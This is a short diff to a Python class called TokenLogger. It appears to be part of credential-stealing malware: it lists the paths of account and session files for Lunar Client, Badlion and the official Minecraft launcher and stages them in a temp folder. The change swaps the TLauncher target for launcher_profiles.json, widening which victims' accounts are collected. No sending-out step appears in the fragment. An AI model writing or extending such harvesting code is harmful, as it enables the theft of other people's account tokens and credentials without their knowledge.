@@ -18,7 +18,7 @@ class TokenLogger:
         save_to_path = os.path.join(self.temp_path, "Games", "Minecraft")
         minecraft_paths = {
             "Lunar": os.path.join(os.getenv("userprofile"), ".lunarclient", "settings", "game", "accounts.json"),
-            "TLauncher": os.path.join(os.getenv("appdata"), ".minecraft", "TlauncherProfiles.json"),
+            "MinecraftLauncher": os.path.join(os.getenv("appdata"), ".minecraft", "launcher_profiles.json"),
             "Badlion": os.path.join(os.getenv("appdata"), "Badlion Client", "accounts.json"),
         }
 
